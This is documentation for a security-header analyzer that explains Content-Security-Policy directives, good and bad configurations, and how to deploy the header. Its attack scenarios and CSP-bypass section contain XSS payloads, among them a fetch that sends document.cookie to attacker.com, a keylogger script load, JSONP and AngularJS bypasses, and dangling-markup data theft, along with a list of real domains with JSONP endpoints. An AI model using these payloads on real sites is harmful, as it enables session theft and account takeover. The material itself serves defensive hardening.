# CSP (Content-Security-Policy) Security Header

## Quick Reference

**Header:** `Content-Security-Policy`
**Purpose:** Controls which resources can be loaded to prevent XSS and injection attacks
**Severity if Missing:** **CRITICAL**
**Complexity:** Hard

**Best Practice Configuration:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```

---

## What It Does

Content Security Policy (CSP) is a powerful defense-in-depth mechanism that **prevents Cross-Site Scripting (XSS)** and other code injection attacks by controlling which resources (scripts, styles, images, etc.) the browser is allowed to load and execute.

CSP works by defining a whitelist of trusted sources for each resource type. When a page tries to load a resource from an untrusted source, the browser blocks it and reports a violation.

This header is your last line of defense: even if an attacker manages to inject malicious code into your HTML, CSP can prevent it from executing.

---

## How It Works

### Header Syntax

```
Content-Security-Policy: <directive> <source>; <directive> <source>; ...
```

### Key Directives

**Resource Control:**
- **`default-src`** - Fallback for all resource types
- **`script-src`** - JavaScript sources
- **`style-src`** - CSS sources
- **`img-src`** - Image sources
- **`font-src`** - Font sources
- **`connect-src`** - AJAX/WebSocket/EventSource connections
- **`media-src`** - Audio/video sources
- **`object-src`** - Flash/plugins (recommend `'none'`)

**Security Directives:**
- **`frame-ancestors`** - Who can embed this page (like X-Frame-Options)
- **`base-uri`** - Allowed `<base>` tag URLs
- **`form-action`** - Where forms can submit to

### Source Values

**Special Keywords (must be quoted):**
- **`'self'`** - Same origin only
- **`'none'`** - Block everything
- **`'unsafe-inline'`** - ⚠️ Allow inline scripts/styles (defeats XSS protection)
- **`'unsafe-eval'`** - ⚠️ Allow `eval()` and similar (dangerous)

**Secure Alternatives:**
- **`'nonce-<random>'`** - Allow specific inline scripts with matching nonce
- **`'sha256-<hash>'`** - Allow specific inline scripts matching hash

**Domains:**
- `https://cdn.example.com` - Specific domain
- `*.example.com` - All subdomains
- `https:` - Any HTTPS source

---

## Real-World Attack Scenarios

### Attack 1: Stored XSS Without CSP

**Scenario:** Comment system with XSS vulnerability

**Step 1:** Attacker submits malicious comment
```html
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Step 2:** Vulnerable application stores comment in database

**Step 3:** Victim loads page with comments
```html
<div class="comment">
    <script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
    </script>
</div>
```

**Step 4:** Malicious script executes, steals session cookie

**Result:** Account takeover

---

**With CSP:**

**Header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**Step 1-3:** Same as above

**Step 4:** Browser blocks inline script
```
Refused to execute inline script because it violates the following
Content Security Policy directive: "script-src 'self'"
```

**Result:** Attack prevented, user safe

---

### Attack 2: Reflected XSS via URL Parameter

**Without CSP:**

**Attack URL:**
```
https://site.com/search?q=<script>alert(document.cookie)</script>
```

**Vulnerable Code:**
```php
<?php
echo "Search results for: " . $_GET['q'];
?>
```

**Output:**
```html
Search results for: <script>alert(document.cookie)</script>
```

**Result:** Script executes, cookies stolen

---

**With CSP:**

**Header:**
```
Content-Security-Policy: script-src 'self'
```

**Result:** Inline script blocked, attack fails

---

### Attack 3: Malicious External Script Injection

**Without CSP:**

**Attacker injects:**
```html
<script src="https://evil.com/keylogger.js"></script>
```

**Result:** Keylogger loads and runs, credentials stolen

---

**With CSP:**

**Header:**
```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com
```

**Browser blocks:**
```
Refused to load script from 'https://evil.com/keylogger.js'
because it violates: "script-src 'self' https://trusted-cdn.com"
```

**Result:** Attack prevented

---

## Configuration Examples

### Good Configuration ✅

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'
```

**Why it's good:**
- `default-src 'self'` - Restrictive default (same origin only)
- `script-src 'self'` - No inline scripts, only same-origin JS files
- `object-src 'none'` - Blocks Flash and plugins
- `base-uri 'self'` - Prevents base tag injection
- `frame-ancestors 'none'` - Prevents clickjacking
- `form-action 'self'` - Forms can only submit to same origin

**Use case:** Maximum security for modern applications

---

### Acceptable Configuration (With Nonces) ⚠️

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-Xy8zF9k2'; style-src 'self' 'nonce-Xy8zF9k2'
```

**HTML:**
```html
<script nonce="Xy8zF9k2">
    // Inline script with nonce
    console.log('Allowed');
</script>
```

**Why it's acceptable:**
- Uses cryptographically random nonce
- Nonce must be regenerated on each page load
- Allows necessary inline scripts securely
- Better than `'unsafe-inline'`

**Use case:** When inline scripts are necessary

---

### Bad Configuration ❌

```
Content-Security-Policy: default-src *; script-src * 'unsafe-inline' 'unsafe-eval'
```

**Why it's terrible:**
- `default-src *` - Allows resources from ANY domain (wildcard)
- `'unsafe-inline'` - Allows inline scripts (defeats XSS protection)
- `'unsafe-eval'` - Allows `eval()` (enables code injection)
- Provides ZERO protection against XSS

**Never use this:** This is worse than having no CSP at all

---

### Dangerous Pattern ❌

```
Content-Security-Policy: script-src 'self' https: data:
```

**Why it's dangerous:**
- `https:` - Allows scripts from ANY HTTPS site
- `data:` - Allows `data:` URIs (can encode malicious scripts)
- Attacker can inject: `<script src="https://evil.com/hack.js"></script>`

---

## Common Mistakes

### 1. Using 'unsafe-inline'

**Mistake:**
```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

**Problem:** Defeats entire purpose of CSP for XSS protection

**Fix:** Use nonces or hashes:
```
Content-Security-Policy: script-src 'self' 'nonce-RandomValue'
```

---

### 2. Wildcard Protocols

**Mistake:**
```
Content-Security-Policy: script-src 'self' https: http:
```

**Problem:** Allows scripts from ANY https/http site

**Fix:** List specific trusted domains:
```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com
```

---

### 3. Missing object-src

**Mistake:**
```
Content-Security-Policy: default-src 'self'
```

**Problem:** Doesn't explicitly block plugins (Flash, Java)

**Fix:**
```
Content-Security-Policy: default-src 'self'; object-src 'none'
```

---

### 4. Forgetting base-uri

**Mistake:** Not setting `base-uri`

**Problem:** Attacker can inject `<base href="https://evil.com">` to redirect relative URLs

**Fix:**
```
Content-Security-Policy: default-src 'self'; base-uri 'self'
```

---

## Advanced: CSP Bypass Detection

The analyzer detects **12 common CSP bypass patterns** that attackers exploit to circumvent Content Security Policy protections. Even a "secure-looking" CSP can be vulnerable to these bypasses.

### Bypass 1: JSONP Endpoints ⚠️ HIGH RISK

**What is JSONP?**
JSONP (JSON with Padding) is a technique that allows cross-origin data retrieval. However, many popular domains expose JSONP endpoints that can execute arbitrary JavaScript.

**Vulnerable Configuration:**
```
Content-Security-Policy: script-src 'self' https://accounts.google.com
```

**Attack Scenario:**
An attacker can inject:
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.cookie)"></script>
```

**Result:** The `callback` parameter executes arbitrary JavaScript, bypassing CSP.

**Known JSONP Bypass Domains:**
- `accounts.google.com`, `www.google.com`, `ajax.googleapis.com`
- `maps.googleapis.com`, `www.google-analytics.com`
- `angularjs.org`, `*.cloudflare.com`
- `*.amazonaws.com`, `*.s3.amazonaws.com`
- `cdnjs.cloudflare.com`, `unpkg.com`, `code.jquery.com`
- `maxcdn.bootstrapcdn.com`, `*.bootstrapcdn.com`
- `ajax.aspnetcdn.com`, `*.jsdelivr.net`

**Fix:**
```
# Remove risky CDNs or use strict-dynamic with nonces
Content-Security-Policy: script-src 'self' 'strict-dynamic' 'nonce-RandomValue'
```

---

### Bypass 2: Angular Template Injection ⚠️ HIGH RISK

**Vulnerable Configuration:**
```
Content-Security-Policy: script-src 'self' https://ajax.googleapis.com/ajax/libs/angularjs/
```

**Attack Scenario:**
If your application uses AngularJS and allows user-controlled content:
```html
{{constructor.constructor('alert(1)')()}}
```

**Result:** AngularJS template injection executes arbitrary code.

**Fix:**
- Remove AngularJS CDN from CSP if not needed
- Use Angular (modern) instead of AngularJS
- Sanitize user input rigorously
- Use `'strict-dynamic'` with nonces

---

### Bypass 3: Data URIs in script-src ⚠️ HIGH RISK

**Vulnerable Configuration:**
```
Content-Security-Policy: script-src 'self' data:
```

**Attack Scenario:**
Attacker injects:
```html
<script src="data:text/javascript,alert(document.cookie)"></script>
```

**Result:** Data URI encodes malicious script, bypassing CSP.

**Fix:**
```
# Never allow data: in script-src
Content-Security-Policy: script-src 'self'
```

---

### Bypass 4: AWS S3 Buckets ⚠️ HIGH RISK

**Vulnerable Configuration:**
```
Content-Security-Policy: script-src 'self' https://mybucket.s3.amazonaws.com
```

**Attack Scenario:**
If the S3 bucket has write permissions or misconfigured ACLs:
- Attacker uploads malicious script to bucket
- Script executes with CSP approval

**Fix:**
- Remove S3 domains from CSP
- Use signed URLs with strict expiration
- Host scripts on your own infrastructure

---

### Bypass 5: Missing base-uri ⚠️ MEDIUM RISK

**Vulnerable Configuration:**
```
Content-Security-Policy: script-src 'self'
```
*(Note: `base-uri` is NOT specified)*

**Attack Scenario:**
Attacker injects:
```html
<base href="https://evil.com/">
```

Then your code loads:
```html
<script src="/app.js"></script>
```

**Result:** Browser loads `https://evil.com/app.js` instead of your script.

**Fix:**
```
Content-Security-Policy: script-src 'self'; base-uri 'self'
```

---

### Bypass 6: Missing object-src ⚠️ MEDIUM RISK

**Vulnerable Configuration:**
```
Content-Security-Policy: script-src 'self'
```
*(Note: `object-src` defaults to `default-src`, often permissive)*

**Attack Scenario:**
Attacker injects Flash/plugin content:
```html
<object data="https://evil.com/exploit.swf"></object>
```

**Result:** Flash plugin executes malicious code.

**Fix:**
```
Content-Security-Policy: script-src 'self'; object-src 'none'
```

---

### Bypass 7: script-src 'self' with File Upload ⚠️ MEDIUM RISK

**Vulnerable Configuration:**
```
Content-Security-Policy: script-src 'self'
```

**Attack Scenario:**
If your application allows file uploads to the same origin:
1. Attacker uploads `malicious.js` to `/uploads/malicious.js`
2. Attacker injects: `<script src="/uploads/malicious.js"></script>`

**Result:** Stored XSS via uploaded file.

**Fix:**
- Host user uploads on separate domain (`uploads.example.com`)
- Serve uploads with `Content-Disposition: attachment`
- Use `Content-Type: application/octet-stream` for uploads
- Implement strict file type validation

---

### Bypass 8: unsafe-hashes Without Context ⚠️ LOW-MEDIUM RISK

**Vulnerable Configuration:**
```
Content-Security-Policy: script-src 'self' 'unsafe-hashes' 'sha256-...'
```

**Attack Scenario:**
`unsafe-hashes` allows inline event handlers like:
```html
<button onclick="alert(1)">Click</button>
```

If attacker can inject HTML, they can execute scripts via event handlers.

**Fix:**
- Only use `unsafe-hashes` when absolutely necessary
- Prefer nonces for inline scripts
- Remove inline event handlers

---

### Bypass 9: script-src-elem Without script-src ⚠️ LOW RISK

**Vulnerable Configuration:**
```
Content-Security-Policy: script-src-elem 'self'
```
*(Note: `script-src-elem` controls `<script>` tags but NOT inline handlers)*

**Attack Scenario:**
Attacker can still use:
```html
<img src=x onerror="alert(1)">
```

**Result:** Inline event handler executes.

**Fix:**
```
# Use script-src instead, it covers both
Content-Security-Policy: script-src 'self'
```

---

### Bypass 10: Dangling Markup via img-src ⚠️ LOW RISK

**Vulnerable Configuration:**
```
Content-Security-Policy: img-src *
```

**Attack Scenario:**
Attacker injects:
```html
<img src="https://evil.com/steal?data=
```

Browser fetches:
```
https://evil.com/steal?data=<rest-of-page-content>
```

**Result:** Leaks sensitive page data to attacker.

**Fix:**
```
Content-Security-Policy: img-src 'self' data:
```

---

### How the Analyzer Detects Bypasses

The analyzer automatically checks for all these bypass patterns and categorizes them by severity:

**HIGH Severity Bypasses:**
- JSONP endpoints → Status: **BAD**
- Angular template injection → Status: **BAD**
- Data URIs in script-src → Status: **BAD**
- AWS S3/user-uploaded content domains → Status: **BAD**

**MEDIUM/LOW Severity Bypasses:**
- Missing base-uri → Recommendation only
- Missing object-src → Recommendation only
- script-src 'self' with potential file upload → Recommendation only

**Example Output:**
```
Status: BAD
Severity: HIGH
Message: CSP allows https://ajax.googleapis.com which has known JSONP endpoints that can bypass CSP
Recommendation: Remove https://ajax.googleapis.com from script-src or use 'strict-dynamic' with nonces/hashes instead
```

---

### Best Practices to Prevent Bypasses

✅ **DO:**
- Use `'strict-dynamic'` with nonces for modern browsers
- Explicitly set `base-uri 'self'`
- Set `object-src 'none'`
- Host scripts on your own domain
- Use subresource integrity (SRI) for CDN scripts
- Regularly audit your CSP with tools like [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

❌ **DON'T:**
- Trust CDNs with JSONP endpoints (Google APIs, AngularJS, etc.)
- Allow `data:` URIs in `script-src`
- Use wildcard sources (`*`, `https:`, `http:`)
- Host user uploads on the same origin as scripts
- Leave `base-uri` or `object-src` unspecified

---

## Implementation Guide

### Step 1: Start in Report-Only Mode

Test without breaking your site:

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violations
```

**Violations logged, not blocked**

### Step 2: Collect Violation Reports

Set up endpoint to receive reports:

```javascript
// Express.js example
app.post('/csp-violations', (req, res) => {
    console.log('CSP Violation:', req.body);
    res.status(204).end();
});
```

### Step 3: Fix Violations

Review reports and fix:
- Move inline scripts to external files
- Add trusted CDNs to whitelist
- Remove/replace blocked resources

### Step 4: Enforce Policy

Switch from Report-Only to enforcement:

**Nginx:**
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'" always;
```

**Apache:**
```apache
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'"
```

**Node.js (Express):**
```javascript
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy',
        "default-src 'self'; script-src 'self'; object-src 'none'");
    next();
});
```

---

## Browser Compatibility

| Browser | Version | Support |
|---------|---------|---------|
| Chrome  | 25+     | Full    |
| Firefox | 23+     | Full    |
| Safari  | 7+      | Full    |
| Edge    | 12+     | Full    |
| IE      | None    | Not supported |

**Coverage:** 95%+ of modern browsers

---

## Additional Resources

### Standards
- [CSP Level 3 Spec](https://www.w3.org/TR/CSP3/)
- [MDN CSP Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Google CSP Guide](https://csp.withgoogle.com/)

### Tools
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - Test your policy
- [Report URI](https://report-uri.com/) - CSP reporting service
- [CSP Builder](https://csper.io/docs/generating-content-security-policy) - Policy generator

### Related Headers
- [X-Frame-Options](X-Frame-Options.md) - Superseded by CSP frame-ancestors
- [X-XSS-Protection](X-XSS-Protection.md) - Deprecated, use CSP instead

---

## See Also

- [Analyzer Implementation](../analyzer-reference.md#content-security-policy)
- [Best Practices](../SecurityHeadersBestPractices.md#csp)
- [Attack Scenarios](../ATTACK_SCENARIOS.md#xss)

---

**Last Updated:** 2026-01-01
**Status:** Active
**Severity:** Critical
